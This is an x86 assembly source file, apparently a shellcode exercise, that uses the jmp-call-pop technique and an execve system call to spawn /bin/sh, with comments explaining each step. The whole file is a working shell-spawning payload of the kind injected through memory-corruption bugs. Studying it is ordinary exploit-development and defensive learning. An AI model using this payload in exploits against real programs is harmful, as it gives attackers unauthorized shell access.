global _start

section .text
_start:
    jmp short Call_Shellcode

Shellcode:
    ; Performing execve system call to start /bin/sh

    pop ebx ; pathname

    ; argv requires an array of addresses where the first
    ; address points to the program name.
    ; followed by the address of other string arguments &
    ; should be NULL terminated.
        ; We don't have any arguments apart from the filename.
        ; We can thus use the same address where the `pathname`
        ; was as the first element of the array and then have
        ; 0x00000000 i.e. 4 bytes of NULLs to show that array
        ; is terminated.
    xor eax, eax
    push eax

    ; Store address into edx (envp)
    mov edx, esp

    push ebx
    mov ecx, esp

    ; envp - Array of pointers to strings.
    ; We do want to pass any. So pass the address where 
    ; 0x00000000 is stored.
    ; This is already done above.

    ; Move execve syscall number into eax
    mov eax, 0xB ; 11 - execve

    ; Interrupt
    int 0x80

    ; Don't have to exit because the execve program
    ; replaces us and thus will handle exiting. 
    



Call_Shellcode:
    call Shellcode
    ; Properly null-terminated
    shellpath: db "/bin/sh", 0x00

